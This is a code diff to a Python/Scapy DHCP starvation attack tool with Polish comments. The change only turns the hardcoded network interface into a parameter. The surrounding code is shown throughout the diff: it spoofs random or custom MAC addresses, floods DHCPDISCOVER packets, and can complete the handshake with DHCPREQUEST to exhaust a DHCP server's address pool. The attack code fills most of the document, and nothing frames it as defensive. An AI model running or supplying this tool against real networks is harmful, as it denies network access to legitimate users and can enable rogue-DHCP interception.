@@ -6,10 +6,11 @@ from time import sleep, time
 from threading import Thread
 
 class DHCPStarvation:
-    def __init__(self, singleSpoofedMAC=False, customMAC="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
+    def __init__(self, iface="", singleSpoofedMAC=False, customMAC="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
         self.macs=[]
         self.singlemac=""
 
+        self.iface=iface
         self.singleSpoofedMAC=singleSpoofedMAC
         self.sleepTimer=sleepTimer
         self.finishDORA=finishDORA
@@ -36,7 +37,7 @@ class DHCPStarvation:
         while True: self.starve()
 
     # Nasłuchiwanie pakietów UDP na portach 67 i 68 - Przekazanie pasujących pakietów do metody handleDHCP
-    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface="enp3s0")
+    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface=self.iface)
 
     # Wysłanie odpowiedzi na DHCPOffer - DHCPRequest z otrzymanymi parametrami konfiguracyjnymi 
     def DHCPRequest(self, client_mac, server_mac, server_ip, given_ip):
@@ -51,7 +52,7 @@ class DHCPStarvation:
             ("server_id", server_ip),
             "end"])
         
-        sendp(req, verbose=0, iface="enp3s0")
+        sendp(req, verbose=0, iface=self.iface)
         self.log(f"Wysłano z\t{client_mac} do ({server_ip} {server_mac}) DHCPREQUEST na {given_ip}")
 
     def getDHCPOption(self, packet, option:str):
@@ -125,12 +126,13 @@ class DHCPStarvation:
         pkt /= DHCP(options=[
             ("message-type","discover"),
             "end"])
-        sendp(pkt, verbose=0, iface="enp3s0")
+        sendp(pkt, verbose=0, iface=self.iface)
         self.log(f"Wysłano z\t{src_mac} DHCPDISCOVER")
         sleep(self.sleepTimer)
 
 if __name__ == "__main__":
     # Opis poniższych opcji:
+    # iface                 - Interfejs do nasłuchiwania i generowania ruchu sieciowego.
     # singleSpoofedMAC      - Czy losować za każdym zapytaniem nowy adres MAC
     # customMAC             - Działa tylko przy singleSpoofedMAC = True. Pozwala na ustalenie własnego adresu MAC do przeprowadzenia ataku
     # finishDORA            - Czy po otrzymaniu DHCP Offer odpowiadać za pomocą DHCP Request
@@ -138,6 +140,7 @@ if __name__ == "__main__":
     # targetDHCPServerIP    - Adres IP docelowego serwera DHCP. Domyślna wartość 255.255.255.255 to adres broadcast
     # loggingEnabled        - Czy zapisywać każdy z komunikatów do pliku log.txt?
 
+    iface               = "enp3s0"
     singleSpoofedMAC    = False
     customMAC           = "08:bc:20:66:ae:22"
     finishDORA          = False
